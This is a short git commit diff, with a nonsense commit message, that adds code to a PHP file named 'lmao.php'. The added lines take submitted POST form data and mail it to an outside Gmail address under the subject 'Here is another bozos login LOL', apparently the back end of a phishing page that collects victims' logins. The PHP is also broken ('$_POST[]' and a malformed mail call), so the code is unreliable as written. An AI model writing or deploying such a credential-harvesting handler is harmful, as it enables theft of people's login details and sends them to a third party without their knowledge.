4c3747927cb51373867438171a6935b9b8923b84
Theree <83382093+Therqy@users.noreply.github.com>
2021-12-04 21:07:22 -0600

    dsa
    sadsafgsa

--- lmao.php
+++ lmao.php
@@ -1,4 +1,11 @@
 <?php
   header('Content-Type: text/plain; charset=utf-8');
   echo 'test';
+  
+  if($_POST["Message"]) {
+  mail("gdtheroy@gmail.com", "Here is another bozos login LOL",
+  $_POST[]. "From: theroy0828@gmail.com");
+  }
+
+
 ?>
